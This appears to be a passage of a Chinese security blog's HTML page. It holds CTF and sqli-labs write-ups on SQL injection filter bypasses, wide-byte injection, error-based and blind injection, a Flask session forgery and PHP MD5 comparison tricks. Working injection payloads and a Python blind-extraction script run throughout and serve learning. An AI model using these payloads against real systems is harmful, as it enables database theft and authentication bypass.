+]&#x2F;&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;union&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out union</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;select&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out select</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;UNION&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out UNION</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;SELECT&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out SELECT</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;Union&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out Union</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;Select&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out select</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h2 id="No-27a"><a href="#No-27a" class="headerlink" title="No.27a"></a>No.27a</h2><p>和上一关差不多，就是换成了双引号。</p>
<blockquote>
<p>但看大佬们的答案时，这里有个神奇的payload，我好好研究下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;and(if(ascii(substr((SeLect(table_name)from(SeLect(table_name),(table_rows)from(information_schema.tables)where(table_schema&#x3D;database())and(table_rows&#x3D;14))a),1,1))&gt;137,0,sleep(5)))and&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>

<p>这个payload的核心是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SeLect(table_name)from(SeLect(table_name),(table_rows)from(information_schema.tables)where(table_schema&#x3D;database())and(table_rows&#x3D;8))a</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/27_2.png" alt="27_2"></p>
<p>因为substr只能处理一个字段，所以将需要请求的两个字段放在from里，并起别名a，这个在No.5floor报错注入里提到过。</p>
<p>但随后发现，不用from也是可以的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;and(if(ascii(substr((SeLect(table_name)from(information_schema.tables)where(table_schema&#x3D;database())and(table_rows&#x3D;14)),1,1))&gt;137,0,sleep(5)))and&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>

<p>但可能以后用得到，所以就把过程都记录下来了。</p>
</blockquote>
<p>从这个payload里学到了，对于<code>limit 0,1</code>空格不能使用时，我们可以使用<strong>其他字段</strong>来增加限制条件。</p>
<h2 id="No-28"><a href="#No-28" class="headerlink" title="No.28"></a>No.28</h2><p>先测试注入点，发现是单引号加小括号注入。</p>
<p><img src="/2020/09/26/sql-labs/28_1.png" alt="28_1"></p>
<p>发现这里的select和union被过滤，于是想到可不可以双写注入：</p>
<p><img src="/2020/09/26/sql-labs/28_2.png" alt="28_2"></p>
<p>这里双写的select和union又出现了，很迷，看一下源码“</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;union\s+select&#x2F;i&#39;,&quot;&quot;, $id);</span><br></pre></td></tr></table></figure>

<p>\s是空格的意思，+是匹配随便多少个空格，意思是去掉<code>union+空格类似符+select</code>。</p>
<p>于是这样构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;)%0aunion%0aunion%0aselect%0aselect%0a1,2,3%0aand &#39;1&#39;&#x3D;(&#39;1</span><br></pre></td></tr></table></figure>

<p>这关不回显错误，所以不能用布尔注入。</p>
<h2 id="No-28a"><a href="#No-28a" class="headerlink" title="No.28a"></a>No.28a</h2><p>和上一关一样，也可以用布尔注入和时间注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Sql-labs&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)and &#39;1&#39;&#x3D;(&#39;2			&#x2F;&#x2F;不返回</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Sql-labs&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)and &#39;1&#39;&#x3D;(&#39;1			&#x2F;&#x2F;返回</span><br></pre></td></tr></table></figure>

<p>payload类似于</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;) %0a and %0a if((ascii(substring((select %0a table_name %0a from %0a information_schema.tables %0a where %0a table_schema&#x3D;&#39;security&#39; %0a limit %0a 0,1),1,1))&gt;200),1,sleep(2))%0a and &#39;1&#39;&#x3D;(&#39;1</span><br><span class="line"></span><br><span class="line">%00截断似乎也可以：</span><br><span class="line">?id&#x3D;1&#39;) %0a and %0a if((ascii(substring((select %0a table_name %0a from %0a information_schema.tables %0a where %0a table_schema&#x3D;&#39;security&#39; %0a limit %0a 0,1),1,1))&gt;200),1,sleep(2))%0a;%00</span><br></pre></td></tr></table></figure>









<h2 id="No-29-No-31"><a href="#No-29-No-31" class="headerlink" title="No.29-No.31"></a>No.29-No.31</h2><p>这三关都讲了一件事：<a href="http://www.mamicode.com/info-detail-2909452.html" target="_blank" rel="noopener">看这</a>和<a href="https://www.cnblogs.com/lcamry/p/5762961.html" target="_blank" rel="noopener">这里</a></p>
<p>讲的是服务器的两层架构，总的来说可以利用<strong>参数污染</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Sql-labs&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2			</span><br><span class="line">&#x2F;&#x2F;这样显示的是id&#x3D;2的搜索内容，直接在id&#x3D;2后面进行注入点测试即可</span><br></pre></td></tr></table></figure>





<h2 id="No-32【宽字节注入】【绕过引号】"><a href="#No-32【宽字节注入】【绕过引号】" class="headerlink" title="No.32【宽字节注入】【绕过引号】"></a>No.32【宽字节注入】【绕过引号】</h2><p>这一关过滤了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">&#x2F;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string &#x3D; preg_replace(&#39;&#x2F;&#39;. preg_quote(&#39;\\&#39;) .&#39;&#x2F;&#39;, &quot;\\\\\\&quot;, $string);          &#x2F;&#x2F;escape any backslash</span><br><span class="line">    $string &#x3D; preg_replace(&#39;&#x2F;\&#39;&#x2F;i&#39;, &#39;\\\&#39;&#39;, $string);                               &#x2F;&#x2F;escape single quote with a backslash</span><br><span class="line">    $string &#x3D; preg_replace(&#39;&#x2F;\&quot;&#x2F;&#39;, &quot;\\\&quot;&quot;, $string);                                &#x2F;&#x2F;escape double quote with a backslash</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/32_1.png" alt="32_1"></p>
<p>正常注入’会被转义，这里我没想到可以用宽字节注入，因为汉字是两个字节，我们可以在,即转义符号之前加上另一个十六进制把它构成一个汉字：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1%dd&#39;</span><br></pre></td></tr></table></figure>

<p>这里%dd变成十六进制（0xdd）和后面的\（0x5c）在一起构成了0xdd0x5c是一个汉字，后面的单引号就被释放了。</p>
<blockquote>
<p>宽字节注入：本人理解的是，由于英文编码每个字母占一个字节，而汉语编码每个汉字占用两个字节，而注入的时候会自动在单引号和双引号前面加上反斜杠（\’)进行转义造成注入失败，所以前面再加上一个汉语编码，如%df（其他编码也可以，不过要ASCII值大于128服务器才会认为是汉字（GBK）编码），由于服务器认为编码是两个字节所以会将后面的反斜杠编码（\）即%5c也看作是汉语编码，从而造成%df%5c被认为是一个汉字，后面的单引号逃逸了出来构成注入。</p>
</blockquote>
<p><img src="/2020/09/26/sql-labs/32_2.png" alt="32_2"></p>
<p>这样就成功报错，接下来正常注入就行了</p>
<p>还有一个小问题，就是我们遇到如下语句时也是会接触双引号的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>

<p>这里有两种方法绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方法一：直接用database()代替&#39;security&#39;</span><br><span class="line">?id&#x3D;-1%dd%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()--+</span><br><span class="line"></span><br><span class="line">方法二：可以使用十六进制绕过</span><br><span class="line">?id&#x3D;-1%dd%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;0x7365637572697479--+</span><br><span class="line">&#x2F;&#x2F;首先，这里的十六进制之前要加0x；</span><br><span class="line">&#x2F;&#x2F;其次，这里十六进制encoding的只是security而不是&#39;security&#39;</span><br></pre></td></tr></table></figure>

<p>爆列类似：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%dd%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1)--+</span><br></pre></td></tr></table></figure>









<h2 id="No-33【addslashes-】"><a href="#No-33【addslashes-】" class="headerlink" title="No.33【addslashes()】"></a>No.33【addslashes()】</h2><p>这一关用的addslashes()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string&#x3D; addslashes($string);    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但总的注入方法还是一样的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%dd&#39;  union select 1,database(),3--+</span><br></pre></td></tr></table></figure>







<h2 id="No-34【POST绕过引号】"><a href="#No-34【POST绕过引号】" class="headerlink" title="No.34【POST绕过引号】"></a>No.34【POST绕过引号】</h2><p>这一关也是过滤引号，只不过数据是要用POST传递，既然是POST传递，那么结果就会被url编码，比如%dd会变成%25dd。既然这样我们就只能取原字符，类似于：</p>
<p><img src="/2020/09/26/sql-labs/34_1.png" alt="34_1"></p>
<p>也可以bp直接跑，还是填%dd，不会二次编码。</p>
<h2 id="No-35"><a href="#No-35" class="headerlink" title="No.35"></a>No.35</h2><p>都一样，就是成了数字型注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;0x7365637572697479--+</span><br></pre></td></tr></table></figure>





<h2 id="No-36-No-37【mysql-real-escape-string-】"><a href="#No-36-No-37【mysql-real-escape-string-】" class="headerlink" title="No.36-No.37【mysql_real_escape_string()】"></a>No.36-No.37【mysql_real_escape_string()】</h2><blockquote>
<p><code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符：</p>
<ul>
<li><code>\x00</code></li>
<li><code>\n</code></li>
<li><code>\r</code></li>
<li><code>\</code></li>
<li><code>&#39;</code></li>
<li><code>&quot;</code></li>
<li><code>\x1a</code></li>
</ul>
</blockquote>
<p>而对于sql注入来说这个函数和之前的addslashes()函数差距应该不是太大，所以注入方式就见前两关，不再赘述。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/09/16/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/">登录页面</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-09-16</time><div class="content"><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="flask-session"><a href="#flask-session" class="headerlink" title="flask session"></a>flask session</h3><p>找到登录的session进行解密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sessionEncode.py decode -c &quot;.eJw9kMGKg0AQRH9l6bMHMzGXQA6RcUWhe4i0yMxFdjcmZkazoIZEQ_59hxz2XLxHVT2hPg3N2MJ2Gm5NAPXlCNsnfHzDFjTvQyXjC4n8QvYgUGQPJTFCLiylSWjSZMZl_9BczsSdQ25bwxgZmYWGY0t2vyGpV8Zms7bJgoyzqUxLPc4qzR3xIfSZIOmztOgUZzMtRU_9pzPsIlyOHVodUZU9tD0vZPFuqtwqWXomdyjwTrLtFeMOXgH8jMOpnn5dc_2f4DVrlSZrEplHS-FxpxlDX1kQn32luFWy6LDSG7J6pRe3psPurbt-9Y1XTM04QQC3sRne58AqhNcfXiFkGQ.X2FsNg.eplpTBkI29NWHzaZMftZka03qFY&quot;</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&#123;&quot; b&quot;:&quot;YTA0ODBiN2JiNjQ2M2IxODM4MTRjNGE0ZGEyMzAxYTUyNTlkMThhZTM4ZDI0ZTBjNjA5NDY1ZjIyYjEzMTMyZWZhNmMyOGJkNTQ0ZjI2NDEzMGRlOTIyNzRmNmFkZTk4MzdlMjY4NWIxYjgzNjMwZWJjODU2NDJkM2MwNDhmOTM&#x3D;&quot;&#125;,&quot;csrf_token&quot;:&#123;&quot; b&quot;:&quot;ZTk3OGE3N2IwZWU2ZWJkYTM0YTU2NTgzMTBhODRlMWY5NjY1Yzk3NQ&#x3D;&#x3D;&quot;&#125;,&quot;name&quot;:&quot;test&quot;,&quot;user_id&quot;:&quot;10&quot;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>然后把test改成admin再加密成session【有错】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\session.py encode -s &quot;ckj123&quot; -t &#39;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&#123;&quot; b&quot;:&quot;YTA0ODBiN2JiNjQ2M2IxODM4MTRjNGE0ZGEyMzAxYTUyNTlkMThhZTM4ZDI0ZTBjNjA5NDY1ZjIyYjEzMTMyZWZhNmMyOGJkNTQ0ZjI2NDEzMGRlOTIyNzRmNmFkZTk4MzdlMjY4NWIxYjgzNjMwZWJjODU2NDJkM2MwNDhmOTM&#x3D;&quot;&#125;,&quot;csrf_token&quot;:&#123;&quot; b&quot;:&quot;ZTk3OGE3N2IwZWU2ZWJkYTM0YTU2NTgzMTBhODRlMWY5NjY1Yzk3NQ&#x3D;&#x3D;&quot;&#125;,&quot;name&quot;:&quot;admin&quot;,&quot;user_id&quot;:&quot;10&quot;&#125;&#39;</span><br></pre></td></tr></table></figure>





<h2 id="unicode欺骗"><a href="#unicode欺骗" class="headerlink" title="unicode欺骗"></a>unicode欺骗</h2><p><a href="https://unicode-table.com/en/1D3A/" target="_blank" rel="noopener">这个网站找字符</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/09/01/sql%E6%B3%A8%E5%85%A5/">sql注入</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-09-01</time><div class="content"><h2 id="ex1"><a href="#ex1" class="headerlink" title="ex1"></a>ex1</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="/2020/09/01/sql%E6%B3%A8%E5%85%A5/e1_1.png" alt="e1_1"></p>
<p>使用UNION时，会出现一行虚拟的数据，这时候我们可以虚拟化一个原来的username【George】并且给他配上一个新的密码，这样操作的同时，我们就可以通过新的密码登录这个用户。</p>
<h3 id="例题：-GXYCTF2019-BabySQli"><a href="#例题：-GXYCTF2019-BabySQli" class="headerlink" title="例题：[GXYCTF2019]BabySQli"></a>例题：[GXYCTF2019]BabySQli</h3><p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; union select 1,&#39;admin&#39;,&#39;4e42f7dd43ecbfe104de58610557c5ba&#39;#</span><br></pre></td></tr></table></figure>

<p>因为username的输入无效，因此mysql返回的数据也只有我们虚拟化的那一行，即可成功登录。</p>
<h3 id="题目环境复现"><a href="#题目环境复现" class="headerlink" title="题目环境复现"></a>题目环境复现</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'pw'</span>];</span><br><span class="line">$sql = <span class="string">"select * from user where username = '"</span>.$name.<span class="string">"'"</span>;   </span><br><span class="line"><span class="comment">// echo $sql;</span></span><br><span class="line">$result = mysqli_query($con, $sql);      </span><br><span class="line">$arr = mysqli_fetch_row($result);</span><br><span class="line"><span class="comment">// print_r($arr);</span></span><br><span class="line"><span class="keyword">if</span>($arr[<span class="number">1</span>] == <span class="string">"admin"</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(md5($password) == $arr[<span class="number">2</span>])&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"wrong pass!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"wrong user!"</span>);</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>





<h2 id="ex2"><a href="#ex2" class="headerlink" title="ex2"></a>ex2</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><img src="/2020/09/01/sql%E6%B3%A8%E5%85%A5/e2_1.png" alt="e2_1"></p>
<p>这个是利用了extractvalue()函数报错【updatexml】</p>
<h2 id="ex3（异或注入）"><a href="#ex3（异或注入）" class="headerlink" title="ex3（异或注入）"></a>ex3（异或注入）</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>本题过滤了union，按道理说可以使用</p>
<blockquote>
<p>利用<code>/*!union*/</code>可以绕过对union的过滤</p>
</blockquote>
<p>但是本题又过滤了*，所以可以使用以下异或注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select(column)from(table)			&#x2F;&#x2F;获取flag字段</span><br><span class="line">substr((select(column)from(table)),n,1)			&#x2F;&#x2F;获取flag字段的第n个字符</span><br><span class="line">ascii(substr((select(column)from(table)),n,1))&gt;N			&#x2F;&#x2F;判断其ascii码是否大于N</span><br><span class="line">0^(ascii(substr((select(column)from(table)),n,1))&gt;N)			&#x2F;&#x2F;如果判断式子为真，则相当于输入1，为假则相当于输入0</span><br></pre></td></tr></table></figure>





<h3 id="例题-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#例题-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="例题:[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>例题:[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>写出python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://df9ba400-06d5-4de6-bdd2-ee86a9a7a73e.node3.buuoj.cn/index.php'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">		payload = <span class="string">'0^(ascii(substr((select(flag)from(flag)),'</span> + str(i) + <span class="string">',1))&gt;'</span> + str(j) + <span class="string">')'</span></span><br><span class="line">		s = requests.post(url, data = &#123;<span class="string">'id'</span>:payload&#125;)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> s.text.find(<span class="string">'Error'</span>)&gt;<span class="number">0</span>:</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>





<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="ex1-极客大挑战-2019-HardSQL"><a href="#ex1-极客大挑战-2019-HardSQL" class="headerlink" title="ex1:[极客大挑战 2019]HardSQL"></a>ex1:[极客大挑战 2019]HardSQL</h3><p>过滤了空格，=，and，or</p>
<p>于是有以下注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(database())),0x7e),1)%23&amp;password&#x3D;admin   &#x2F;&#x2F;爆库名</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1)%23&amp;password&#x3D;admin        &#x2F;&#x2F;爆表名</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columnss)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1)%23&amp;password&#x3D;admin        &#x2F;&#x2F;爆列名</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1)%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>

<p>接着发现只出现了左半部分的长度，于是想到用right()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e),1)%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>



<p><strong>extractvalue()</strong>原理一样，就是比updatexml()少一个参数，即两个没用的参数1去掉后面的那个。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/08/10/md5%E6%9C%89%E5%85%B3%E6%BC%8F%E6%B4%9E/">md5有关漏洞</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-10</time><div class="content"><h2 id="有关md5的sql漏洞"><a href="#有关md5的sql漏洞" class="headerlink" title="有关md5的sql漏洞"></a>有关md5的sql漏洞</h2><blockquote>
<p>Hint: select * from ‘admin’ where password=md5($pass,true)</p>
</blockquote>
<p>我们可知道，这句sql语句本来应该是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure>

<p>我们就可以思考能不能找到一个字符串，经过md5加密之后会形成<code>&#39;or&#39;xxxxx</code>或者<code>xxxxx&#39;or&#39;</code>，其中xxxxx为真。因为这样之后就会构成sql的永真搜索：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;&#39;&#39; or &#39;xxxxx&#39;   &#x2F;&#x2F;xxxxx为真</span><br></pre></td></tr></table></figure>



<p>然后发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure>

<p>经过md5可以变成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or&#39;6�]��!r,��b</span><br></pre></td></tr></table></figure>

<p>即可成功绕过</p>
<blockquote>
<p>这里留下一个问题，日后可以自己写脚本看看能不能跑出类似的字符串</p>
</blockquote>
<h2 id="md5弱类型比较"><a href="#md5弱类型比较" class="headerlink" title="md5弱类型比较"></a>md5弱类型比较</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>看了一下有两种方法：</p>
<ol>
<li><p>直接数组绕过，因为数组不能md5加密，所以返回假，两者就像等了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以找两个字符串，他们md5加密之后都类似于“0exxxxxx”，这样根据科学计数法，二者都等于0，所以相等。【我觉着1exxxxx应该也可以】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;QNKCDZO&amp;b&#x3D;s214587387a</span><br></pre></td></tr></table></figure>





</li>
</ol>
<h2 id="md5强类型比较"><a href="#md5强类型比较" class="headerlink" title="md5强类型比较"></a>md5强类型比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">			<span class="keyword">echo</span> `$cmd`;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



